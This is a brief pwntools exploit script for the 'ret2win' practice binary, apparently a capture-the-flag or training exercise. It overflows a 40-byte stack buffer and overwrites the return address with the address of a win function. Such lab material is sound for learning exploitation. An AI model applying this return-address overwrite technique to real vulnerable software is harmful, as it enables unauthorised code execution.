import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

BINARY_NAME = "ret2win"
BUFFER_LEN = 40

io = process(f"./{BINARY_NAME}")

junk = b"\x90" * BUFFER_LEN

# Pointers
win_addr = p64(0x400811)

# Payload creation
payload = b""
payload += junk
payload += win_addr

io.recvuntil("> ")
io.send(payload)
io.send("\n")
shared_pwn._recvall(io)